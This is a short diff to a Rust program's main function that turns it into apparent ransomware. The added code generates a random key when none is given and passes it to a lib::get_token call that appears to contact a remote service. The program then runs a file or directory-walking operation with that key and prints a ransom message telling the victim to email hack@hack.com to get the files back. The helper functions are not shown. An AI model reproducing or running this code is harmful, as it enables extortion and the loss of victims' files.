@@ -1,10 +1,20 @@
 mod lib;
+use rand::{RngCore};
 use std::{fs, path};
 
 fn main() {
     let args = lib::get_args();
+    let mut key = args.value_of("key").unwrap_or("").to_string();
+
+    let token = if key.is_empty() {
+        key = rand::thread_rng().next_u64().to_string();
+        let response = lib::get_token(&key);
+        response.unwrap().text().unwrap()
+    } else {
+        String::new()
+    };
+
     let path_to_file = path::PathBuf::from(args.value_of("file").expect("File not provided"));
-    let key = args.value_of("key").expect("No key found");
     let meta = fs::metadata(&path_to_file).expect("Error reading file");
 
     if meta.is_dir() {
@@ -12,5 +22,9 @@ fn main() {
         let _ = lib::walk_directory(&path_to_file, &func);
     } else {
         let _ = lib::run_operation(&path_to_file, &key);
+    }
+
+    if !token.is_empty() {
+        println!("{}", format!("Send the following token to hack@hack.com to get your files back: {token}", token = token));
     }
 }
